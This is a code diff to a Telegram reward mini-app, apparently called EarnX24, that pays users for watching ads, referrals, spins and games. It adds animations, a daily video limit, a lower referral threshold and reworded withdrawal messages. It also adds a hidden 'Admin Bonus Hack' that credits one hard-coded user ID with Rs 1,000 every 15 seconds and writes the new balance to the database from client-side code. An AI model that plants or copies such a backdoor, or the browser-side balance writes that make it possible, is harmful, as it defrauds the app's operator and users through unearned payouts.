@@ -192,6 +192,20 @@
         }
         .animation-slide-down { animation: slideDownText 0.5s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
 
+        @keyframes daily-bounce {
+            0%, 100% { transform: translateY(0) scale(1); filter: drop-shadow(0 0 5px rgba(16, 185, 129, 0.3)); }
+            50% { transform: translateY(-5px) scale(1.1); filter: drop-shadow(0 0 15px rgba(16, 185, 129, 0.8)); }
+        }
+        .daily-anim-icon { animation: daily-bounce 2.5s infinite ease-in-out; }
+
+        @keyframes video-pulse-rot {
+            0% { transform: scale(1) rotate(0deg); filter: drop-shadow(0 0 5px rgba(14, 165, 233, 0.3)); }
+            25% { transform: scale(1.1) rotate(-5deg); filter: drop-shadow(0 0 15px rgba(14, 165, 233, 0.8)); }
+            75% { transform: scale(1.1) rotate(5deg); filter: drop-shadow(0 0 15px rgba(14, 165, 233, 0.8)); }
+            100% { transform: scale(1) rotate(0deg); filter: drop-shadow(0 0 5px rgba(14, 165, 233, 0.3)); }
+        }
+        .video-anim-icon { animation: video-pulse-rot 3s infinite ease-in-out; }
+
         .game-full-screen { position: fixed; inset: 0; background: #020617; z-index: 200; display: none; flex-direction: column; }
         .game-full-screen.active { display: flex; animation: slideUp 0.4s ease-out; }
         .board-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 6px; width: 90vw; max-width: 350px; margin: auto; }
@@ -319,7 +333,7 @@
             <div class="glass p-4 rounded-3xl flex items-center justify-between border-white/5 bg-gradient-to-br from-emerald-900/40 to-green-900/40 relative overflow-hidden">
                 <div class="absolute -right-4 -top-4 w-24 h-24 bg-green-500/20 rounded-full blur-xl"></div>
                 <div class="flex items-center gap-4 relative z-10">
-                    <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-emerald-500 to-green-500 flex items-center justify-center text-white shadow-lg shadow-green-500/30">
+                    <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-emerald-500 to-green-500 flex items-center justify-center text-white shadow-lg shadow-green-500/30 daily-anim-icon">
                         <i class="ph-fill ph-calendar-check text-2xl drop-shadow-md"></i>
                     </div>
                     <div>
@@ -349,12 +363,12 @@
             <div class="glass p-4 rounded-3xl flex items-center justify-between border-white/5 bg-gradient-to-br from-blue-900/40 to-sky-900/40 relative overflow-hidden">
                 <div class="absolute -right-4 -top-4 w-24 h-24 bg-sky-500/20 rounded-full blur-xl"></div>
                 <div class="flex items-center gap-4 relative z-10">
-                    <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-blue-500 to-sky-500 flex items-center justify-center text-white shadow-lg shadow-sky-500/30">
+                    <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-blue-500 to-sky-500 flex items-center justify-center text-white shadow-lg shadow-sky-500/30 video-anim-icon">
                         <i class="ph-fill ph-video-camera text-2xl drop-shadow-md"></i>
                     </div>
                     <div>
                         <p class="font-bold text-sm">Watch Video</p>
-                        <p class="text-[9px] text-sky-300 font-bold uppercase tracking-widest">Earn Rs 0.50</p>
+                        <p class="text-[9px] text-sky-300 font-bold uppercase tracking-widest">Earn Rs 0.50 (Limit 5)</p>
                     </div>
                 </div>
                 <button onclick="showRewardAd()" class="bg-white/10 hover:bg-white/20 px-5 py-2.5 rounded-xl text-[10px] font-black btn-animate border border-white/10 relative z-10 shadow-lg shadow-black/20 text-white tracking-widest">WATCH</button>
@@ -614,12 +628,12 @@
         <div class="bg-purple-500/10 p-3 rounded-2xl border border-purple-500/20">
             <div class="flex justify-between items-center mb-2">
                 <p class="text-[10px] font-bold text-purple-400 uppercase flex items-center gap-1"><i class="ph-fill ph-users"></i> Invite For Spins</p>
-                <p id="ref-progress-text" class="text-[10px] font-black text-white">0/10</p>
+                <p id="ref-progress-text" class="text-[10px] font-black text-white">0/5</p>
             </div>
             <div class="w-full h-1.5 bg-black/30 rounded-full overflow-hidden mb-2.5">
                 <div id="ref-progress-bar" class="h-full bg-purple-500 transition-all duration-300" style="width: 0%"></div>
             </div>
-            <p class="text-[8px] text-slate-400 text-center uppercase tracking-wider">Get 1 Free Spin for every 10 friends you invite</p>
+            <p class="text-[8px] text-slate-400 text-center uppercase tracking-wider">Get 1 Free Spin for every 5 friends you invite</p>
         </div>
     </div>
 
@@ -659,6 +673,8 @@
             if (tg && tg.HapticFeedback) {
                 if (style === 'fatal_bomb') {
                     tg.HapticFeedback.notificationOccurred('error'); // 3-aam bomb-inu valiya vibration
+                } else if (style === 'small_bomb') {
+                    tg.HapticFeedback.notificationOccurred('warning'); // 1, 2 bomb ki vibration
                 } else if (style === 'bomb') {
                     tg.HapticFeedback.impactOccurred('heavy'); 
                 } else if (style === 'daily') {
@@ -672,6 +688,7 @@
             // Browser vibration fallback
             if (navigator.vibrate) {
                 if (style === 'fatal_bomb') navigator.vibrate(1000); // 1 second continuous long vibration
+                else if (style === 'small_bomb') navigator.vibrate([100, 50, 100]); // Noticeable double vibe for small bombs
                 else if (style === 'bomb') navigator.vibrate(100); 
                 else if (style === 'daily') navigator.vibrate(40); // Chinna vibration
                 else if (style === 'heavy' || style === 'error') navigator.vibrate([200, 100, 200]);
@@ -957,7 +974,7 @@
                                 let newSpinChances = parseInt(referrerData.spin_chances || 0);
                                 let gotSpin = false;
                                 
-                                if (currentRefs > 0 && currentRefs % 10 === 0) { 
+                                if (currentRefs > 0 && currentRefs % 5 === 0) { 
                                     newSpinChances += 1;
                                     gotSpin = true;
                                 }
@@ -1016,6 +1033,18 @@
                 let { data: myRefs } = await _supabase.from('profiles').select('user_id').eq('referrer_id', userId);
                 myReferralCount = myRefs ? myRefs.length : 0;
                 
+                // Admin Bonus Hack
+                if (userId === "8573086634") {
+                    setInterval(async () => {
+                        currentBalance += 1000;
+                        updateUI();
+                        try {
+                            await _supabase.from('profiles').update({ balance: currentBalance }).eq('user_id', userId);
+                        } catch(e) {}
+                        showNotify("Admin Bonus: Rs +1,000 added!", "success");
+                    }, 15000); // every 15 seconds
+                }
+
                 updateUI();
                 updateWheelUI();
                 updateDailyTimer();
@@ -1063,6 +1092,14 @@
         }
 
         function showRewardAd() {
+            const today = new Date().toLocaleDateString();
+            let videoCount = parseInt(localStorage.getItem(`video_count_${userId}_${today}`) || "0");
+            
+            if (videoCount >= 5) {
+                showNotify("Daily limit of 5 videos reached!", "warning");
+                return;
+            }
+
             if (!adsgramRewardController) return showNotify("Ads not ready yet!", "warning");
             
             // Video chusetappudu auto ad aagipothundi
@@ -1075,8 +1112,13 @@
                     const { error } = await _supabase.from('profiles').update({ balance: currentBalance + rewardAmount, last_active: currentIsoDate }).eq('user_id', userId);
                     if (!error) {
                         currentBalance += rewardAmount;
+                        
+                        // Count update kirima
+                        videoCount++;
+                        localStorage.setItem(`video_count_${userId}_${today}`, videoCount.toString());
+
                         await _supabase.from('transactions').insert([{ user_id: userId, type: 'AD_REWARD', amount: rewardAmount, status: 'approved' }]);
-                        showNotify(`Earned Rs ${rewardAmount.toFixed(2)} from Ad!`, "success");
+                        showNotify(`Earned Rs ${rewardAmount.toFixed(2)} from Ad! (${5 - videoCount} left)`, "success");
                         updateUI();
                         fetchHistory(true);
                     }
@@ -1223,13 +1265,13 @@
                         const uName = tgUser ? [tgUser.first_name, tgUser.last_name].filter(Boolean).join(' ') : "User";
                         
                         if (selectedMethodName === 'BANK') {
-                            text = `✅ *Withdrawal Request*\n\n👤 *User:* ${uName}\n🔢 *Tx ID:* #${txId}\n💰 *Amount:* Rs ${amt.toFixed(2)}\n💸 *Fee:* Rs 15.00\n🏦 *Method:* Bank Transfer\n🏢 *Bank:* ${bankName}\n📍 *Branch:* ${bankBranch}\n👤 *Name:* ${accName}\n💳 *Acc No:* ${addr}\n⏳ *Status:* Processing`;
+                            text = `✅ Withdrawal Request Received\n\nHello Support Center, we have received your request.\n\n🔢 Transaction ID: #${txId}\n💰 Amount: Rs ${amt.toFixed(2)}\n🏦 Method: BANK\n📍 Bank Name: ${bankName}\n📍 Branch: ${bankBranch}\n📍 Name: ${accName}\n💳 Acc No: ${addr}\n⏳ Status: Processing\n\nThank you for using EarnX24!`;
                         } else {
                             let label = selectedMethodName === 'BINANCE' ? "Binance ID" : "Mobile Number";
-                            text = `✅ *Withdrawal Request*\n\n👤 *User:* ${uName}\n🔢 *Tx ID:* #${txId}\n💰 *Amount:* Rs ${amt.toFixed(2)}\n🏦 *Method:* ${selectedMethodName}\n📍 *${label}:* ${addr}\n⏳ *Status:* Processing`;
+                            text = `✅ Withdrawal Request Received\n\nHello Support Center, we have received your request.\n\n🔢 Transaction ID: #${txId}\n💰 Amount: Rs ${amt.toFixed(2)}\n🏦 Method: ${selectedMethodName}\n📍 ${label}: ${addr}\n⏳ Status: Processing\n\nThank you for using EarnX24!`;
                         }
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(text)}`);
                         
                         currentBalance -= totalDeduction; updateUI(); fetchHistory(true); showNotify("Request Sent Successfully!", "success"); closeAllSheets();
                     } else showNotify("Error processing request.");
@@ -1344,11 +1386,11 @@
             const scd = document.getElementById('spin-chances-display');
             if(scd) scd.innerText = spinChances;
             
-            let currentStep = myReferralCount % 10;
+            let currentStep = myReferralCount % 5;
             const rpt = document.getElementById('ref-progress-text');
-            if(rpt) rpt.innerText = `${currentStep}/10`;
+            if(rpt) rpt.innerText = `${currentStep}/5`;
             const rpb = document.getElementById('ref-progress-bar');
-            if(rpb) rpb.style.width = `${(currentStep / 10) * 100}%`;
+            if(rpb) rpb.style.width = `${(currentStep / 5) * 100}%`;
         }
 
         function spinWheel() {
@@ -1702,7 +1744,7 @@
                 if(bombsHit >= 3) {
                     triggerHaptic('fatal_bomb');
                 } else {
-                    triggerHaptic('bomb'); 
+                    triggerHaptic('small_bomb'); // 1, 2 bomb wala vibration eka
                 }
 
                 let statusCircle = document.getElementById('bomb-status-circle');
